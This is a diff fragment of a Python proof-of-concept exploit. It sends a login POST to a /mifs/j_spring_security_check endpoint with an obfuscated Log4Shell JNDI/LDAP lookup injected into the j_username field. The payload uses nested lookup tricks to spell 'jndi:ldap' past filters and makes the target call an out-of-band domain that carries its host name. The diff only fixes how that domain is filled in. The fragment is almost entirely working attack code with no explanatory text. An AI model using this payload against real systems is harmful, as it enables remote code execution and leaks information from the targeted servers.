@@ -44,7 +44,7 @@ def poc(url):
 
         path = """/mifs/j_spring_security_check"""
         method = "POST"
-        data = """j_username=${j${k8s:k5:-ND}i${sd:k5:-:}${lower:l}d${lower:a}${lower:p}://${hostName}.oob_domain}&j_password=password&logincontext=employee"""
+        data = """j_username=${j${k8s:k5:-ND}i${sd:k5:-:}${lower:l}d${lower:a}${lower:p}://${hostName}.%s}&j_password=password&logincontext=employee""" % oob_domain
         headers = {'Content-Type': 'application/x-www-form-urlencoded'}
         resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)
 
